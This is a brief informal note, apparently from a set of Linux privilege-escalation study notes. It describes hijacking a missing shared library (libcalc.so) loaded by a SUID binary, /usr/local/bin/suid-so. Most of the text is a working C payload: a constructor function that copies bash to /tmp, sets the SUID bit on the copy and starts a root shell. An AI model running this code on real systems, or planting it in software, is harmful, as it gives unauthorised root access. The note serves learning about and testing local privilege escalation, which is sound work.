if we see 
` root     staff        9861 May 14  2017 /usr/local/bin/suid-so`

SUID and SGID for are highlighted 

if we run the SUID we do not know what is happening so we use strings we can se there is no file present as config


![](/Linux-Privilege-Notes/images/suid.png)
we can override libcalc.so add something malicious 

Code Below 
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));

void inject(){

   system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");


}



like below 

![](/Linux-Privilege-Notes/images/shared_object.png)
